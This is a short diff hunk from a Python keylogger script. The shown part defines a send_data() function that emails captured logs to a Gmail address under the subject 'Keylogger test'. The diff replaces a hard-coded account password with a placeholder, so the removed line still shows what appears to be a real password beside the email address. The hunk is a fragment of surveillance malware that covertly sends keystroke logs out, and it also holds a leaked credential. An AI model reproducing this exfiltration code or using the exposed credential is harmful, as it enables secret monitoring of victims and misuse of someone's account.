@@ -14,7 +14,7 @@ log_file = open('log.txt', 'w+')
 def send_data():
     msg = MIMEMultipart()
     email = "programming.fadn@gmail.com"
-    password = "f42904558"
+    password = "passwordhere"
     msg["From"] = email
     msg["To"] = email
     msg["Subject"] = "Keylogger test"
